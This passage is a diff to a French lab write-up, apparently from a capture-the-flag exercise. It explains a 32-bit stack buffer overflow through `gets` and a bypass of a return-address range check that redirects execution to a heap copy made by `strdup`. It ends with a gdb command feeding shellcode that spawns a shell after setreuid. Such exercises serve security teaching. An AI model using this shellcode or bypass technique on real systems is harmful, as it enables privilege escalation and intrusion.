@@ -51,7 +51,7 @@ Dump of assembler code for function p:
    0x080484f8 <+36>:	mov    eax,DWORD PTR [ebp-0xc]
    0x080484fb <+39>:	and    eax,0xb0000000                 
    0x08048500 <+44>:	cmp    eax,0xb0000000
-   0x08048505 <+49>:	jne    0x8048527 <p+83>               # si pas dans la plage libc -> continue normalement
+   0x08048505 <+49>:	jne    0x8048527 <p+83>               # si pas dans la plage 0xb0 -> continue normalement
    0x08048507 <+51>:	mov    eax,0x8048620                  # sinon : détection, message d'erreur, exit
    0x0804850c <+56>:	mov    edx,DWORD PTR [ebp-0xc]
    0x0804850f <+59>:	mov    DWORD PTR [esp+0x4],edx
@@ -75,8 +75,10 @@ En regardant le code assembleur de la fonction `p` on remarque l'appel à la fon
 On va donc pouvoir contrôler le registre d'instruction `eip` en faisant un buffer overflow.
 Pour cela, on doit d'abord déterminer l'offset pour atteindre `eip`.
 
-L'instruction à `main+19` indique que l'on met la valeur dans `ebp-0x4c` dans le registre `eax`.
-Puis à `main+22` on fait pointer esp vers la valeur dans `eax`, cela permet de preparer le buffer de retour pour l'appel à la fonction `gets`. On comprend que le buffer fait `0x4c` en hexa donc 76 octets. On va donc logiquement overflow au delà de 76 octets transmis à `gets`. L'instruction du prologue à `p+0` `push ebp` nous indique qu'avant le buffer de 76 octets il faut compter 4 octets pour l'adresse de sauvegarde de l'ancien `ebp`, `esp` se trouve logiquement juste au dessus (vers les adresses plus haute) de cette adresse sur la stack.
+L'instruction à `p+19` indique que l'on met la valeur dans `ebp-0x4c` dans le registre `eax`.
+Puis à `p+22` on fait pointer esp vers la valeur dans `eax`, cela permet de preparer le buffer de retour pour l'appel à la fonction `gets`. On comprend que le buffer fait `0x4c` en hexa donc 76 octets. On va donc logiquement overflow au delà de 76 octets transmis à `gets`. 
+
+Le prologue (`push ebp`) nous indique que l'ancien `ebp` est sauvegardé juste avant l'exécution du code de `p`. Or par convention d'appel, l'adresse de retour est empilée par le call juste avant ce prologue — elle se trouve donc immédiatement au-dessus du saved ebp sur la pile, soit à `ebp+0x4`.
 
 On va donc logiquement avoir un offset de 80 octets (76 octets du buffer et 4 octets de `ebp`) pour atteindre `eip`. Pour confirmer cet offset on construit un petit script python de 80 "A" et 4 "B" :
 
@@ -150,15 +152,20 @@ La valeur de `eip` est mise `eax` pour faire une comparaison avec `and` et `cmp`
 A `p+44` l'instruction `and eax,0xb0000000` met à 0 tous les bits où le masque vaut 0 et conserve la valeur de `eax` là où le masque vaut 1. 
 
 Dans l'exploit précédent la valeur comparée est `bffff6e0` et `1011 1111 1111 1111 1111 0110 1110 0000` en binaire.
-Seuls les 4 premiers octets seront réellement comparés `1011` étant  égaux aux 4 premiers octets de `0xb0000000` qui sont `1011`, eax est mis à la valeur de `1011`.
+Seuls les 4 premiers bits (soit le premier chiffre hexadécimal) seront réellement discriminants dans la comparaison, car le masque 0xb0000000 n'a de bits à 1 que dans cet octet de poids fort (1011 0000).
+
+Après l'instruction `and`, `eax` vaut `0xb0000000` uniquement si les bits 31, 29 et 28 de l'adresse d'origine valaient 1 (le bit 30 est annulé par le masque des deux côtés de la comparaison, donc il n'a pas d'importance).
 
 Donc le check bloque toute adresse de retour dont l'octet de poids fort commence par `0xb` ou `0xf`.
 Ce check bloque ainsi 
 - les adresses de la stack de l'utilisateur (typiquement mappée autour de `0xbffff000`–`0xbfffffff`)
 - les bibliothèques partagées (libc)
+- toutes adresses commancant par `0xf` même si aucune zone mémoire utile de ce binaire ne s'y trouve sur ce système
 
 On va pouvoir exploiter la heap via `strdup`, les adresses dans la heap commencant par `0x08`.
 En effet, ici, `strdup()` recopie le contenu du buffer (donc le shellcode pour l'exploit) dans une nouvelle zone allouée sur la heap. Don au lieu de faire pointer l'adresse de retour vers notre shellcode sur la pile, il faut faire pointer vers la copie de ce même shellcode sur le tas, dont l'adresse passe le contrôle. On détermine cette adresse en regardant la valeur retournée par `eax` après le call au `strdup()`.
+
+Comme l'adresse retournée par strdup() pointe exactement sur le premier octet du buffer copié, il n'est plus nécessaire de faire précéder le shellcode d'un sled de NOPs pour "viser large", l'adresse cible est connue avec précision. Le sled de NOPs a été conservé après le shellcode simplement pour conserver un padding de même taille, sans nécessité fonctionnelle.
 
 ``` bash
 (gdb) run < <(python2 -c 'print("\x6a\x31\x58\x99\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x89\xd1\xcd\x80" + "\x90" * 46 + "A" * 4)')
